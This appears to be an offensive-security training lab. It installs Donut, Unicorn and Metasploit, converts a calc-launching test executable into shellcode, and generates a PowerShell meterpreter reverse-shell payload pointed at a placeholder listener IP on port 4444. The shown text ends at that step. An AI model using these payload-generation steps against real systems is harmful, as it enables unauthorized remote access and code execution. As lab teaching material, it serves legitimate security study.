Generate Custom Payloads with Donut, Unicorn, and MSBuild
Objectives
Install and use the Donut framework to convert a Windows executable into position-independent shellcode
Generate PowerShell and macro-based reverse shell payloads using the Unicorn toolkit
Build a Python automation script that produces MSBuild XML payloads with configurable payload types
Prerequisites
Comfort with the Ubuntu command line: navigating directories, running scripts, reading command output
Basic Python 3 knowledge: classes, methods, file I/O, and subprocess calls
Familiarity with networking concepts: what a reverse shell is, what LHOST and LPORT mean
Lab Environment
You will work on a dedicated AWS EC2 Ubuntu instance provided by Al Nafi. The instance has a base Ubuntu installation; you will install all required tools in Task 1.

Task 1: Install and Verify All Required Tools
This task installs every tool the lab depends on. Complete all steps before moving to Task 2.

Step 1: Update the system and install build dependencies
sudo apt-get update -y && sudo apt-get upgrade -y
sudo apt-get install -y git build-essential python3 python3-pip wget unzip mingw-w64
Confirm success: python3 --version prints a 3.x version and x86_64-w64-mingw32-gcc --version prints a compiler version.

Step 2: Install the Donut framework
Donut is a tool that converts Windows executables (.exe, .dll) into position-independent shellcode that can run from memory.

cd /opt
sudo git clone https://github.com/TheWover/donut.git
cd donut
sudo make
Official installation reference if the repository URL changes: https://github.com/TheWover/donut

Confirm success: running ./donut with no arguments prints a usage banner that lists -f, -a, and -o flags.

Troubleshoot this step:

Error seen: make: *** [Makefile:XX: donut] Error 1 with a message about a missing header such as windows.h.
Recovery: run sudo apt-get install -y gcc-multilib then repeat sudo make from /opt/donut.
Official docs: https://github.com/TheWover/donut#building
Step 3: Install the Unicorn toolkit
Unicorn (by TrustedSec) is a Python-based tool that wraps msfvenom to produce shellcode and wraps it in delivery formats such as PowerShell scripts and Office macros.

cd /opt
sudo git clone https://github.com/trustedsec/unicorn.git
sudo chmod +x /opt/unicorn/unicorn.py
sudo ln -sf /opt/unicorn/unicorn.py /usr/local/bin/unicorn
Official reference if the repository URL changes: https://github.com/trustedsec/unicorn

Confirm success: unicorn --help (or python3 /opt/unicorn/unicorn.py --help) prints a usage banner listing payload format options.

Troubleshoot this step:

Error seen: bash: unicorn: command not found after creating the symlink.
Recovery: verify the symlink with ls -la /usr/local/bin/unicorn; if it points to a non-existent path, recreate it with the full absolute path: sudo ln -sf /opt/unicorn/unicorn.py /usr/local/bin/unicorn.
Official docs: https://github.com/trustedsec/unicorn#installation
Step 4: Install Metasploit Framework (required by Unicorn)
Unicorn calls msfvenom internally to generate shellcode, so Metasploit must be present.

cd /tmp
wget -fsSL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -O msfinstall
chmod +x msfinstall
sudo ./msfinstall
Official reference if the installer URL changes: https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html

Confirm success: msfvenom --version prints a version string such as Framework Version: 6.x.x.

Troubleshoot this step:

Error seen: wget: unable to resolve host 'raw.githubusercontent.com' or HTTP 404 written to msfinstall.
Recovery: check network connectivity with curl -I https://raw.githubusercontent.com and consult the official nightly installer page for an updated URL.
Official docs: https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
Task 2: Generate Shellcode with Donut and Payloads with Unicorn
Step 1: Create a test Windows executable with MinGW
MinGW (Minimalist GNU for Windows) lets you cross-compile Windows binaries on Linux. You will compile a minimal C program that launches calc.exe, then feed it to Donut.

mkdir -p ~/lab11/payloads
cd ~/lab11/payloads

cat > hello_calc.c << 'EOF'
#include <windows.h>
int main(void) {
    WinExec("calc.exe", SW_SHOW);
    return 0;
}
EOF

x86_64-w64-mingw32-gcc hello_calc.c -o hello_calc.exe -lkernel32
Confirm success: ls -lh hello_calc.exe shows a file larger than 0 bytes with a .exe extension.

Step 2: Convert the executable to shellcode with Donut
Run Donut three times to produce the same shellcode in three output formats. The -f flag controls format (1 = raw binary, 2 = C array, 3 = Python bytes literal) and -a 2 targets x64.

cd ~/lab11/payloads

/opt/donut/donut -f 1 -a 2 -o shellcode.bin hello_calc.exe
/opt/donut/donut -f 2 -a 2 -o shellcode.c   hello_calc.exe
/opt/donut/donut -f 3 -a 2 -o shellcode.py  hello_calc.exe
Confirm success: ls -lh shellcode.* shows three files; shellcode.bin is typically 5-50 KB depending on the input executable size.

Step 3: Generate a PowerShell reverse-shell payload with Unicorn
Replace YOUR_IP below with the IP address shown by ip addr show on your instance (the eth0 inet address). Port 4444 is used as the listener port throughout this lab.

mkdir -p ~/lab11/unicorn_payloads
cd ~/lab11/unicorn_payloads

python3 /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp YOUR_IP 4444 powershell
Confirm success: Unicorn creates two files in the current directory: powershell_attack.txt (the delivery one-liner) and unicorn.rc (a ready-made Metasploit listener resource script).

